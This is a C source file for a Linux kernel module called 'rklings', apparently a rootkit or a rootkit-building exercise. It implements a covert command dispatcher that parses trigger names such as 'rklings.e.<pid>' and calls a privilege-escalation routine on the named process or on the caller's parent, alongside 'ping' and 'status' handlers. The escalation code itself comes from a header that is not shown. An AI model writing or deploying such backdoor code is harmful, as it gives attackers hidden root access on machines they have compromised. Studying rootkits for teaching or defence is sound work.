// SPDX-License-Identifier: GPL-2.0
#include "rklings_command.h"
#include "rklings_escalation.h"
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/string.h>

static int rk_cmd_ping(const char *arg)
{
	if (arg)
		return -EINVAL;
	pr_info("rklings: pong\n");
	return 0;
}

static int rk_cmd_status(const char *arg)
{
	if (arg)
		return -EINVAL;
	pr_info("rklings: alive, escalations=%d\n", rk_escalation_count());
	return 0;
}

static int rk_cmd_escalate(const char *arg)
{
	pid_t pid;
	int ret;

	if (!arg)
		return rk_escalate_pid(task_ppid_nr(current));
	ret = kstrtoint(arg, 10, &pid);
	if (ret)
		return ret;
	if (pid <= 0)
		return -EINVAL;
	return rk_escalate_pid(pid);
}

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *name;
	rk_handler_t handler;
};

static const struct rk_cmd_entry rk_commands[] = {
	{ "e", rk_cmd_escalate },
	{ "ping", rk_cmd_ping },
	{ "status", rk_cmd_status },
};

int rk_dispatch(const char *name)
{
	const char *command = name + strlen("rklings.");
	const char *separator = strchr(command, '.');
	const char *argument = separator ? separator + 1 : NULL;
	size_t command_length = separator ? separator - command : strlen(command);
	size_t i;

	for (i = 0; i < ARRAY_SIZE(rk_commands); i++) {
		if (strlen(rk_commands[i].name) == command_length &&
		    !strncmp(command, rk_commands[i].name, command_length))
			return rk_commands[i].handler(argument);
	}
	return -ENOENT;
}
